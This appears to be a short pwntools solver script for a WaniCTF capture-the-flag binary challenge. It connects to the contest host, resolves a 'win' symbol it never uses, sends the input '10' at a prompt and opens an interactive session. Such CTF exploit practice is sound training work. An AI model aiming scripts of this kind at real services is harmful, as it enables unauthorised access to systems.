from pwn import *

local = False
fname = './chall'
host = 'chal-lz56g6.wanictf.org'
port = 9003

r = remote(host,port) if not local else process(["/glibc/2.34/64/lib/ld-linux-x86-64.so.2",fname],env={"LD_PRELOAD":"/glibc/2.34/64/lib/libc.so.6"})
vuln = ELF(fname)
win_addr = vuln.sym['win']


if __name__ == '__main__':
    r.recvuntil(b'x')
    r.sendline(b'10')
    r.interactive()